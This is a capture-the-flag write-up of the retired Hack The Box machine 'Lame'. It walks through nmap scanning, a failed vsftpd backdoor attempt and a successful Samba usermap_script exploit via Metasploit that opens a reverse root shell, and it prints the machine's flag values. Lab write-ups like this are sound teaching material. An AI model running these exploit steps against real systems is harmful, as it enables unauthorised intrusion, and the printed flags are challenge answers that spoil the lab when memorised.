---
layout: writeup
name: "lame"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
date: 2025-11-12
pwned: true
---
# Hack The Box - Lame (10.10.10.3)

## 🧠 Summary

**Lame** is a retired Linux machine that showcases basic enumeration and exploitation of vulnerable services. The box includes vulnerable versions of **vsftpd** and **Samba**, allowing for Metasploit-based exploitation. Ultimately, we gain a root shell through the `user_map_script` Samba exploit (CVE-2007-2447).

---

## 🔍 Enumeration

### 🔹 Nmap

```bash
nmap -p- lame.htb --min-rate 5000
nmap -p 21,22,139,445 -sC -sV lame.htb -oN nmap_alert
```

**Open Ports:**
- 21/tcp – vsftpd 2.3.4 (anonymous FTP login allowed)
- 22/tcp – SSH (OpenSSH 4.7p1)
- 139, 445/tcp – Samba smbd 3.0.20

---

## 💥 Exploitation

### 1. ⚠️ VSFTPD Backdoor Attempt (CVE-2011-2523)

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(...) > set RHOSTS lame.htb
msf6 exploit(...) > run
[*] Exploit completed, but no session was created.
```

> 📌 Likely blocked by local firewall or patched.

---

### 2. 🎯 Samba Usermap Script Exploit (CVE-2007-2447)

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(...) > set RHOSTS lame.htb
msf6 exploit(...) > set LHOST 10.10.14.12
msf6 exploit(...) > run
```

**Result:**
```bash
[*] Command shell session 1 opened (10.10.14.12:4444 -> 10.10.10.3:42271)
```

---

## 🏁 Flags

```bash
cat /home/makis/user.txt
599b4dfc6f9118692e6238451b0b19df

cat /root/root.txt
7b81765f6ee8a59bb4d7de5df85e1903
```

---

## 📌 Notes

- The **vsftpd exploit failed**, likely due to firewall blocking reverse connections.
- The **Samba usermap script** vulnerability provided immediate root shell.
- This box is ideal for beginners learning how to enumerate and use Metasploit effectively.

---

*Writeup by [inkedqt](https://github.com/inkedqt)*
